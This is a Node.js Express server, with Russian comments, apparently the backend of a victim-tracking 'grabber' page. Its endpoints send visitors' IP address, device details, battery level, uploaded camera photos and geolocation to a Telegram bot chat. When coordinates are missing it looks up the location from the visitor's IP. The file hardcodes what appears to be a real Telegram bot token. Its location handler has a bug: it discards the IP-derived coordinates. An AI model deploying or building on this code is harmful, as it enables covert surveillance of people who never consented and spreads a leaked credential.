// Серверный код для Vercel
const express = require('express')
const axios = require('axios')
const FormData = require('form-data')
const cors = require('cors')
const multer = require('multer')

const app = express();

// Конфигурация
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '6725080038:AAH9HLWT6_ORc9U15jkVo06DIOQMjk17P-c';

// Middleware
app.use(cors({
  origin: true, // Разрешить все источники (для тестирования)
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin'],
  optionsSuccessStatus: 200
}))

app.use(express.json({ limit: '10mb' }))
app.use(express.urlencoded({ extended: true, limit: '10mb' }))
app.set('trust proxy', true);

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Обработчик для preflight запросов
app.options('*', cors());

// Обработчик для корневого пути
app.get('/', (req, res) => {
  res.json({ 
    message: 'API is running on Vercel', 
    status: 'OK',
    timestamp: new Date().toISOString()
  });
});

// Обработчик для проверки состояния API
app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy',
    timestamp: new Date().toISOString()
  });
});

// новый функционал
app.post('/sendDataToTelegram', upload.none(), async(req, res)=>{
  const {chat_id, batteryLevel, deviceInfo, screenWidth, screenHeight, clientIp} = req.body

  try{
    const userIP = req.headers['x-forwarded-for']?.split(',')[0] || clientIp?.split(',')[0]
    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);

    const text = `User Data:\n\n` +
                    `🔋 battery Level : ${batteryLevel}\n\n` +
                    `📍 IP Address: ${userIP}\n\n` +
                    `🌐 Browser: ${req.headers['user-agent']}\n\n` +
                    `📱 Device: ${req.headers['user-agent']?.includes('Mobile') ? 'Mobile Device' : 'Desktop Device'}\n\n` +
                    `🖥 Platform: ${req.headers['user-agent']?.includes('Windows') ? 'Windows' : 'Other'}\n\n` +
                    `📏 Resolution: ${screenWidth}x${screenHeight}`;

    formData.append('text', text);

    const response = await axios.post(apiUrl, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

    res.sendStatus(200);
  }catch(err){
    console.error('Error sending data to Telegram:', err);
    res.status(500).send('Error sending data to Telegram');
  }
})

app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
  const { chat_id } = req.body;
  const photo = req.file;
  
  if (!photo) { 
    return res.status(400).send('No file uploaded');
  }

  try {
    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('photo', photo.buffer, {
      filename: photo.originalname,
      contentType: photo.mimetype,
      knownLength: photo.size,
    });

    const response = await axios.post(apiUrl, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

    res.sendStatus(200);
  } catch (error) {
    console.error('Error sending photo to Telegram:', error);
    res.status(500).send('Error sending photo to Telegram');
  }
});

app.post('/sendLocationToTelegram', async (req, res) => {
  const { chat_id, latitude, longitude, clientIp } = req.body;

  try {
    const userIP = req.headers['x-forwarded-for'] || clientIp;

    let coords = { latitude, longitude };
    if (!latitude || !longitude) {
      const ipResponse = await axios.get(`https://ipinfo.io/${userIP}/json`);
      const { loc } = ipResponse.data;
      const [lat, lon] = loc.split(',');
      coords = { latitude: lat, longitude: lon };
    }
    
    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('latitude', latitude);
    formData.append('longitude', longitude);

    const response = await axios.post(apiUrl, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

    res.sendStatus(200);
  } catch (error) {
    console.error('Error sending location to Telegram:', error);
    res.status(500).send('Error sending location to Telegram');
  }
});

// Экспорт для Vercel
module.exports = app;
